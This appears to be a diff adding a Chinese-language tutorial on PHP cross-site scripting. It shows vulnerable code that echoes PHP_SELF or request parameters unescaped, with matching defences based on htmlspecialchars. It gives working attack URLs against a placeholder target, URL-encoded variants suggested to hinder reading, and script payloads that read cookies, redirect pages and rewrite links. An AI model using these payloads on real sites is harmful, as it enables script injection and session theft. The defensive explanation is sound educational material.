@@ -1,0 +1,70 @@
+﻿PHP_SELF利用：
+
+后台代码
+<form method="post" action="<?php echo $_SERVER[PHP_SELF];?>">
+</form>
+
+攻击URL：
+http://www.target.com/xss.php/"><script>alert('hacked')</script>
+URLEncode:
+http://www.target.com/xss.php/%22%3E%3Cscript%3Ealert('hacked')%3C/script%3E
+
+
+说明：
+xss.php后面的的斜杆用于防止解析成其他文件而不是xss.php文件，因为
+访问：http:/www.target.com/xss.php/aaa.html 时aaa.html是不存在的
+按道理说页面会返回404但是其实返回的是xss.php因为某些URL解析机制造成的
+因此有了这个斜杆，后面就可以加上任何内容来带入到xss.php的PHP_SELF里面
+
+防御：
+htmlspecialchars($_SERVER['PHP_SELF']);
+
+
+=======================================================================
+未转义的直接输出利用：
+
+后台代码：
+<?php
+ //下面四个都可以被利用
+  echo $_GET['name'];
+  echo $_POST['name'];
+  echo $_COOKIE['name'];
+  echo $_REQUEST['name'];
+?>
+
+针对GET的攻击URL
+http://www.target.com/xss.php?name=<script>alert('hacked')</script>
+URLEncode:
+http://www.target.com/xss.php%3Fname%3D%3Cscript%3Ealert%28%27hacked%27%29%3C%2fscript%3E
+
+说明：
+因为php页面对提交的参数直接输出到html上面，导致可以直接利用
+
+防御：
+function check_input($data) {
+  $data = trim($data);
+  $data = stripslashes($data);
+  $data = htmlspecialchars($data);
+  return $data;
+}
+
+=======================================================================
+利用方式，利用前可以URLencode编码打破可读性：
+
+1.获取cookie  
+  <script> alert(document.cookie) </script>
+
+
+2.跳转URL：   
+  <script> window.location=http://www.baidu.com </script>
+
+
+3.修改链接：  
+<script> 
+   window.onload = function(){
+       var links = document.getElementsByTagName('a');
+       links[0].href="http://www.baidu.com";
+   }
+</script>
+
+
